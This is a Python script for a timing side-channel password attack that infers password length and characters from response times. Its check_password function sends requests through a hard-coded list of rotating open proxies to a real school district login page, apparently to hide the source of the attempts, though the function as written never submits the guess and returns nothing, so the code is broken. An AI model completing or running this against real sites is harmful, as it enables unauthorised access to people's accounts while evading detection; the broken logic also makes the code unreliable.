import itertools
import string
import timeit
import numpy as np
import random
import requests

allowed_chars = string.ascii_lowercase + " "
password_database = {"test username": "test password"}


def check_password(infofile, user, guess):
    proxies = ["173.68.59.131:3128",
               "68.183.221.156:44968",
               "47.243.154.235:12345",
               "47.245.33.104:12345",
               "75.119.153.111:80",
               "162.144.235.219:3128",
               "174.138.180.11:80",
               "165.22.64.68:38429",
               "172.107.159.202:443",
               "172.107.159.203:443",
               "168.119.248.202:3128",
               "35.222.148.80:80",
               "129.159.88.228:80",
               "167.86.110.82:80",
               "23.107.176.97:32180",
               "150.136.37.217:80",
               "165.22.81.30:38244",
               "165.227.188.89:80",
               "207.7.90.101:80",
               "47.88.17.124:1157",
               "129.213.183.152:80",
               "129.146.112.121:80",
               "3.84.211.3:80",
               "165.22.105.218:3128",
               "52.43.40.250:80",
               "157.230.238.32:9000",
               "23.107.176.122:32180",
               "23.107.176.82:32180",
               "50.246.120.125:8080",
               "23.107.176.81:32180",
               "150.136.5.47:80",
               "23.107.176.51:32180"]
    proxy = {"https": random.choice(proxies),
             "http": random.choice(proxies)}

    r = requests.get("https://publish.gwinnett.k12.ga.us/gcps/home/gcpslogin", proxies=proxy)


def random_str(size):
    return ''.join(random.choices(allowed_chars, k=size))


def crack_length(infofile, user, max_len=32):
    trials = 2000
    times = np.empty(max_len)
    for i in range(max_len):
        i_time = timeit.repeat(stmt='check_password(infofile, user, x)',
                               setup=f'infofile={infofile!r};user={user!r};x=random_str({i!r})',
                               globals=globals(),
                               number=trials,
                               repeat=10)
        times[i] = min(i_time)

    most_likely = int(np.argmax(times))
    return most_likely


def crack_password(infofile, user, length, verbose=False):
    guess = random_str(length)
    counter = itertools.count()
    trials = 1000
    while True:
        i = next(counter) % length
        for c in allowed_chars:
            alt = guess[:i] + c + guess[i + 1:]

            alt_time = timeit.repeat(stmt='check_password(infofile, user, x)',
                                     setup=f'infofile={infofile!r};user={user!r};x={alt!r}',
                                     globals=globals(),
                                     number=trials,
                                     repeat=10)
            guess_time = timeit.repeat(stmt='check_password(infofile, user, x)',
                                       setup=f'infofile={infofile!r};user={user!r};x={guess!r}',
                                       globals=globals(),
                                       number=trials,
                                       repeat=10)

            if check_password(infofile, user, alt):
                return alt

            if min(alt_time) > min(guess_time):
                guess = alt
                if verbose:
                    print(guess)
